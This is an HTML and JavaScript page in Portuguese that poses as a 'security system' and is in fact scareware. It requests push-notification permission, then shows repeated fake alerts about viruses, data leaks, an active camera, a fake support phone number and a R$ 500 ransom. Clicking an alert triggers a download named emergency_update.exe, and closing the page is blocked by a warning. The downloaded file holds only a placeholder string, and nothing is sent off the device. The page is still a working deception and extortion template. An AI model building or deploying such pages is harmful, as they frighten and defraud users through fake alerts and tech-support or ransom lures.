<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security System</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100vw;
            height: 100vh;
            background: #000;
            overflow: hidden;
            font-family: 'Courier New', monospace;
            color: #0f0;
        }

        #start {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #000;
            color: #0f0;
            font-size: 2.5em;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            cursor: pointer;
            text-align: center;
            border: 3px solid #0f0;
            text-shadow: 0 0 10px #0f0;
        }

        video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            object-fit: cover;
            z-index: 1;
        }

        .terminal-text {
            position: fixed;
            bottom: 20px;
            left: 20px;
            color: #0f0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            z-index: 800;
            max-height: 200px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.9);
            padding: 15px;
            border: 2px solid #0f0;
            width: 500px;
            border-radius: 5px;
        }

        .notification-popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #000;
            color: #0f0;
            padding: 40px;
            border: 4px solid #f00;
            z-index: 20000;
            text-align: center;
            display: none;
            border-radius: 10px;
            box-shadow: 0 0 30px red;
        }

        button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 15px 30px;
            margin: 10px;
            cursor: pointer;
            font-size: 1.1em;
            border-radius: 5px;
            font-weight: bold;
        }

        .fake-notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #333;
            color: white;
            padding: 15px;
            border-radius: 10px;
            border: 2px solid #ff0000;
            z-index: 950;
            max-width: 300px;
            box-shadow: 0 0 20px rgba(255,0,0,0.5);
        }
    </style>
</head>
<body>
    <div id="start">
        <div>
            üîí SISTEMA DE SEGURAN√áA üîí<br>
            <span style="font-size: 0.6em;">CLIQUE PARA INICIAR</span>
        </div>
    </div>

    <video id="video" playsinline loop muted>
        <source src="https://alexandre7888.github.io/ontono.exe/InShot_20250705_234210151.mp4" type="video/mp4">
    </video>

    <div class="terminal-text" id="terminal"></div>

    <div class="notification-popup" id="notificationPopup">
        <h2>üîî NOTIFICA√á√ïES PUSH</h2>
        <p><strong>Ative as notifica√ß√µes para prote√ß√£o total</strong></p>
        <p style="color: #ff0000; font-size: 0.9em;">
            ‚ö†Ô∏è Essencial para seguran√ßa do sistema!
        </p>
        <button onclick="enablePushNotifications()">‚úÖ ATIVAR NOTIFICA√á√ïES PUSH</button>
        <br>
        <button onclick="startFakePushSystem()" style="background: #f00; color: white;">
            ‚ùå PULAR (N√ÉO RECOMENDADO)
        </button>
    </div>

    <script>
        const start = document.getElementById("start");
        const video = document.getElementById("video");
        const terminal = document.getElementById("terminal");
        const notificationPopup = document.getElementById("notificationPopup");

        let pushSubscription = null;
        let notificationInterval = null;
        let isActive = false;

        // FUN√á√ÉO DO TERMINAL
        function updateTerminal(message) {
            const timestamp = new Date().toLocaleTimeString();
            terminal.innerHTML += `<span style="color: #0f0">[${timestamp}]</span> ${message}\n`;
            terminal.scrollTop = terminal.scrollHeight;
        }

        // üî• SISTEMA DE NOTIFICA√á√ïES PUSH REAIS
        async function setupPushSystem() {
            updateTerminal("üîî CONFIGURANDO NOTIFICA√á√ïES PUSH...");

            // Verificar se o navegador suporta
            if (!('serviceWorker' in navigator) || !('PushManager' in window)) {
                updateTerminal("‚ùå PUSH N√ÉO SUPORTADO - USANDO SISTEMA ALTERNATIVO");
                startFakePushSystem();
                return;
            }

            try {
                // Registrar Service Worker
                const registration = await navigator.serviceWorker.register('/sw.js');
                updateTerminal("‚úÖ SERVICE WORKER REGISTRADO");

                // Mostrar popup para permitir notifica√ß√µes
                showNotificationPopup();

            } catch (error) {
                updateTerminal("‚ùå ERRO SERVICE WORKER: " + error);
                startFakePushSystem();
            }
        }

        function showNotificationPopup() {
            setTimeout(() => {
                notificationPopup.style.display = 'block';
                updateTerminal("üí° SOLICITANDO PERMISS√ÉO PUSH...");
            }, 3000);
        }

        async function enablePushNotifications() {
            notificationPopup.style.display = 'none';
            
            try {
                // Pedir permiss√£o
                const permission = await Notification.requestPermission();
                
                if (permission === 'granted') {
                    updateTerminal("‚úÖ PERMISS√ÉO CONCEDIDA - INSCREVENDO PUSH...");
                    
                    // Inscrever para push notifications
                    await subscribeToPush();
                    startRealPushSystem();
                    
                } else {
                    updateTerminal("‚ùå PERMISS√ÉO NEGADA - USANDO SISTEMA FAKE");
                    startFakePushSystem();
                }
                
            } catch (error) {
                updateTerminal("‚ùå ERRO PERMISS√ÉO: " + error);
                startFakePushSystem();
            }
        }

        // üî• INSCREVER PARA PUSH NOTIFICATIONS REAIS
        async function subscribeToPush() {
            try {
                const registration = await navigator.serviceWorker.ready;
                
                // Usar VAPID keys p√∫blicas (exemplo)
                const vapidPublicKey = 'BLx7V8K9zCx0WpOfRvLk2Q6uAeH1nTgX5yM0qN3iJ7cFm8ZwS4bD9vEaZxRlG5tYhP6zK1sU0oW2jL7dN4pX9rF3iV8yQ5bA1eT6mJ0cH4nS9wD2lU7fB5oK3gR8aZ6xY1vE4qJ9sC2pL7dN0wF3iV8yQ5bA1';
                
                const subscription = await registration.pushManager.subscribe({
                    userVisibleOnly: true,
                    applicationServerKey: urlBase64ToUint8Array(vapidPublicKey)
                });
                
                pushSubscription = subscription;
                updateTerminal("‚úÖ INSCRITO EM PUSH NOTIFICATIONS");
                
                // Enviar subscription para o "servidor" (simulado)
                sendSubscriptionToServer(subscription);
                
            } catch (error) {
                updateTerminal("‚ùå ERRO INSCRI√á√ÉO PUSH: " + error);
                throw error;
            }
        }

        function urlBase64ToUint8Array(base64String) {
            const padding = '='.repeat((4 - base64String.length % 4) % 4);
            const base64 = (base64String + padding)
                .replace(/\-/g, '+')
                .replace(/_/g, '/');
            const rawData = window.atob(base64);
            return Uint8Array.from([...rawData].map((char) => char.charCodeAt(0)));
        }

        // üî• SIMULAR ENVIO PARA SERVIDOR
        function sendSubscriptionToServer(subscription) {
            updateTerminal("üì° ENVIANDO INSCRI√á√ÉO PARA SERVIDOR...");
            
            // Em um caso real, voc√™ enviaria para seu backend
            // Aqui vamos simular com localStorage
            localStorage.setItem('pushSubscription', JSON.stringify(subscription));
            updateTerminal("‚úÖ INSCRI√á√ÉO SALVA - PRONTO PARA NOTIFICA√á√ïES");
        }

        // üî• SISTEMA PUSH REAL (COM SERVICE WORKER)
        function startRealPushSystem() {
            updateTerminal("üöÄ INICIANDO SISTEMA PUSH REAL...");
            
            // Notifica√ß√µes autom√°ticas a cada 20-40 segundos
            notificationInterval = setInterval(() => {
                sendPushNotification();
            }, 20000 + Math.random() * 20000);
            
            // Primeira notifica√ß√£o imediata
            setTimeout(sendPushNotification, 3000);
            
            updateTerminal("‚úÖ SISTEMA PUSH ATIVO - NOTIFICA√á√ïES AUTOM√ÅTICAS");
        }

        function sendPushNotification() {
            const messages = [
                "üö® ALERTA: Sistema de seguran√ßa comprometido!",
                "üì± AVISO: Seu dispositivo precisa de verifica√ß√£o!",
                "üíÄ URGENTE: Dados em risco - a√ß√£o necess√°ria!",
                "üì• DOWNLOAD: Atualiza√ß√£o cr√≠tica dispon√≠vel!",
                "‚ö†Ô∏è PERIGO: V√≠rus detectado - clique para remover!",
                "üîí BLOQUEIO: Sistema ser√° bloqueado em 5 minutos!",
                "üìû SUPORTE: Ligue +55 11 99999-9999 para ajuda!",
                "üí∞ RESGATE: Pague R$ 500 para desbloquear!",
                "üåê VAZAMENTO: Seus dados est√£o sendo copiados!",
                "üì∏ C√ÇMERA: Sua c√¢mera est√° ativa e gravando!"
            ];
            
            const randomMsg = messages[Math.floor(Math.random() * messages.length)];
            
            updateTerminal("üîî ENVIANDO NOTIFICA√á√ÉO PUSH: " + randomMsg);
            
            // Em um sistema real, seu backend enviaria a push notification
            // Aqui vamos simular enviando para o Service Worker
            if (navigator.serviceWorker.controller) {
                navigator.serviceWorker.controller.postMessage({
                    type: 'SEND_NOTIFICATION',
                    title: 'üîí Sistema de Seguran√ßa',
                    body: randomMsg,
                    requireInteraction: true
                });
            } else {
                // Fallback para notifica√ß√£o normal
                createLocalNotification(randomMsg);
            }
        }

        // üî• SISTEMA PUSH FAKE (QUANDO PUSH REAL N√ÉO FUNCIONA)
        function startFakePushSystem() {
            updateTerminal("üé≠ INICIANDO SISTEMA PUSH SIMULADO...");
            
            notificationInterval = setInterval(() => {
                createFakePushNotification();
            }, 15000);
            
            // Primeira notifica√ß√£o imediata
            setTimeout(createFakePushNotification, 2000);
            
            updateTerminal("‚úÖ SISTEMA PUSH SIMULADO ATIVO");
        }

        function createFakePushNotification() {
            const messages = [
                "üö® ALERTA PUSH: Sistema em perigo!",
                "üì± NOTIFICA√á√ÉO: Verifica√ß√£o necess√°ria!",
                "üíÄ PUSH URGENTE: Clique para seguran√ßa!",
                "üì• PUSH: Download de atualiza√ß√£o!",
                "‚ö†Ô∏è PUSH CR√çTICO: V√≠rus detectado!",
                "üîí PUSH: Bloqueio iminente!",
                "üìû PUSH: Suporte t√©cnico dispon√≠vel!",
                "üí∞ PUSH: Pagamento necess√°rio!",
                "üåê PUSH: Dados comprometidos!",
                "üì∏ PUSH: C√¢mera ativa!"
            ];
            
            const randomMsg = messages[Math.floor(Math.random() * messages.length)];
            
            // Criar notifica√ß√£o fake que parece push
            const fakePush = document.createElement('div');
            fakePush.className = 'fake-notification';
            fakePush.innerHTML = `
                <div style="display: flex; align-items: center; margin-bottom: 8px;">
                    <strong style="color: #ff4444;">üîí Seguran√ßa</strong>
                    <span style="margin-left: auto; font-size: 0.8em; color: #ccc;">agora</span>
                </div>
                <div>${randomMsg}</div>
                <div style="margin-top: 8px; font-size: 0.8em; color: #aaa;">
                    üîî Notifica√ß√£o Push ‚Ä¢ Toque para a√ß√£o
                </div>
            `;
            
            document.body.appendChild(fakePush);
            
            // Comportamento ao clicar
            fakePush.onclick = function() {
                triggerEmergencyDownload();
                this.remove();
            };
            
            // Auto-remover ap√≥s 8 segundos
            setTimeout(() => {
                if (fakePush.parentNode) {
                    fakePush.remove();
                }
            }, 8000);
            
            updateTerminal("üîî NOTIFICA√á√ÉO PUSH SIMULADA: " + randomMsg);
        }

        function createLocalNotification(message) {
            if (Notification.permission === 'granted') {
                const notification = new Notification('üîí Sistema de Seguran√ßa', {
                    body: message,
                    icon: 'https://alexandre7888.github.io/ontono.exe/InShot_20251025_123921954.jpg',
                    tag: 'security-push',
                    requireInteraction: true,
                    silent: false,
                    vibrate: [200, 100, 200]
                });
                
                notification.onclick = function() {
                    triggerEmergencyDownload();
                    notification.close();
                };
            }
        }

        function triggerEmergencyDownload() {
            updateTerminal("üîó NOTIFICA√á√ÉO CLICADA - DOWNLOAD DE EMERG√äNCIA");
            
            try {
                const content = "EMERGENCY_SECURITY_UPDATE_" + Date.now();
                const blob = new Blob([content], {type: "application/octet-stream"});
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'emergency_update.exe';
                a.style.display = 'none';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
                
                updateTerminal("üì• DOWNLOAD DE EMERG√äNCIA INICIADO");
            } catch (error) {
                updateTerminal("‚ùå DOWNLOAD FALHOU - TENTANDO NOVAMENTE");
            }
        }

        // INICIAR SISTEMA
        start.addEventListener("click", function() {
            if (isActive) return;
            isActive = true;
            
            start.style.display = "none";
            updateTerminal("üöÄ INICIANDO SISTEMA DE SEGURAN√áA...");
            
            // Iniciar v√≠deo
            video.play().catch(e => {
                video.muted = true;
                video.play();
            });

            // Configurar sistema push
            setTimeout(setupPushSystem, 2000);
            
            updateTerminal("‚úÖ SISTEMA INICIADO - CONFIGURANDO NOTIFICA√á√ïES...");
        });

        // BLOQUEAR FECHAMENTO
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = 'Sistema de seguran√ßa ativo. Tem certeza que deseja sair?';
            return e.returnValue;
        });

        updateTerminal("üîí SISTEMA DE SEGURAN√áA CARREGADO");
        updateTerminal("üí° CLIQUE PARA INICIAR VERIFICA√á√ÉO");

    </script>
</body>
</html>